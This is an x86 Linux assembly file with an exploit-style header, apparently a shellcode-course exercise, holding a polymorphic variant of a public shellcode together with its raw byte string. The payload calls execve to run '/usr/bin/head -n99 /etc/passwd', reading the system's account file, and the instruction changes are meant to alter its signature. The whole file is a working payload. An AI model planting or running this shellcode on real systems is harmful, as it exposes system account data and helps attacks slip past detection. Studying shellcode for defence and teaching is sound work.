; Exploit Title: /usr/bin/head -n99 cat etc/passwd (poly shellcode-571.php)
; Date: November 29th, 2018
; Exploit Author: Nelis
; Version: 0.2
; Tested on: Ubuntu 12.10
; Filename: headpass.nasm
; SLAE-ID: 1327
; Based on: http://shell-storm.org/shellcode/files/shellcode-571.php

; Shellcode:"\x29\xc0\x50\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe6\x50\x68\x2d\x6e\x39\x39\x89\xe7\x50\x68\x68\x65\x61\x64\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x68\x2f\x75\x73\x72\x89\xe3\x50\x57\x56\x53\xb0\x0b\x89\xe1\xcd\x80"



global _start

section .text
_start:

	sub eax, eax			; changed from xor eax, eax

 	push eax                        ; put 0-term on stack
        push dword 0x64777373           ; dwss
        push dword 0x61702f63           ; ap/c
        push dword 0x74652f2f           ; te//
	mov esi, esp			; save addr of stack into esi

	push eax
	push dword 0x39396e2d         	; 99n-
	mov edi, esp			; save addr of stack into edi

	push eax
	push dword 0x64616568		; daeh
	push dword 0x2f6e6962		; /nib
	push dword 0x2f2f2f2f		; ////
	push dword 0x7273752f		; rsu/ changed from cat to head command
	mov ebx,esp			; unchanged (save addr of stack into into ebx)

;	mov edx, eax			; set edx to NULL / not already 0x0 / keeping it here in case you encouter issues with it
	push eax			; 0-term on stack
	push edi			; added for args
	push esi			; added for args
	push ebx			; pointer to /user////bin/head

	mov al, 0xb                     ; set syscall execve
	mov ecx,esp			; move stack pointer into ecx
	int 0x80			; make syscall